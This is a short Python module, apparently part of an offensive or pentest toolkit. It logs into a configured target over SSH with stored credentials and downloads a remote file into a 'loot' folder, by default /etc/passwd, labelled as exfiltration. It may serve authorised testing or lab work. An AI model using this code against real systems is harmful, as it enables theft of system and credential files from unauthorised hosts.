import paramiko
from utils import banner
import config
from pathlib import Path

def exfiltrate(remote_path: str, local_dir: str = "./loot") -> bool:
    banner(f"Connexion SSH vers {config.TARGET_IP}:{config.SSH_PORT}")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(
            hostname=config.TARGET_IP,
            port=config.SSH_PORT,
            username=config.USERNAME,
            password=config.PASSWORD,
            timeout=5
        )
    except Exception as e:
        banner(f"SSH KO : {e}", "ERROR")
        return False

    sftp = ssh.open_sftp()
    local_dir = Path(local_dir)
    local_dir.mkdir(exist_ok=True)
    local_path = local_dir / Path(remote_path).name
    banner(f"Téléchargement {remote_path}  →  {local_path}")

    try:
        sftp.get(remote_path, str(local_path))
        banner("Exfiltration terminée ✔", "OK")
        return True
    except Exception as e:
        banner(f"Erreur SFTP : {e}", "ERROR")
        return False
    finally:
        sftp.close()
        ssh.close()

if __name__ == "__main__":
    exfiltrate("/etc/passwd")
